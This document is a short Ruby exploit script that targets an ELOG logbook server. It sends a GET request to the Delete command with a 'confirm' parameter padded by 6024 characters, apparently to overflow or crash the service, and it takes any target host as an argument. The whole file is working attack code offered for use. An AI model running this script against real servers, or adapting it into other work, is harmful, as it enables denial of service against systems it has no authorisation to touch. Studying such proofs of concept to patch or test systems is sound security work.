#!/usr/bin/env ruby -W0
# Tested against ELOG V3.1.3-fd7f1e2
require 'rex'

host = ARGV[0]

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin

buffer = "A" * 6024

sock = Rex::Proto::Http::Client.new(host, 
                                    port = "8080", 
                                    context = {}, 
                                    ssl = false)

req = sock.request_cgi(
 {
  'uri'     => '/demo/1',
  'version' => '1.0',
  'method'  => 'GET',
  'vars_get' => {
    'cmd' => 'Delete',
    'nextmsg' => '2',
    'confirm' => "Yes" + buffer,
  },
 })

sock.send_request(req)
data = sock.read_response()
rescue => e
puts "[!] #{e.to_s}"
end
